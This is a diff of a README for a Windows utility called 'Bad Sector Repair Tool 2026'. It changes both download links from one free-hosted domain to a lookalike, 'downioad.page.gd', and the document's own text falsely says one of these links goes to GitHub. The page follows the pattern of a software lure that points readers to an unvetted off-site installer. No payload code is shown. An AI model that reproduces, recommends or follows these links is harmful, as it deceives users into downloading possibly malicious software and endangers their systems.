@@ -2,7 +2,7 @@
 
 This guide covers the Bad Sector Repair Tool 2026, a dedicated Windows application designed to help you identify, manage, and repair bad sectors on your storage drives. Maintaining the integrity of your disks is crucial for data safety and system stability, and this tool provides a straightforward interface to address these physical disk errors.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=windows)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=windows)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -46,7 +46,7 @@ A: This tool is focused primarily on physical bad sectors. For logical errors, y
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 *© 2026 Bad Sector Repair Tool. All rights reserved. For educational and personal use.*
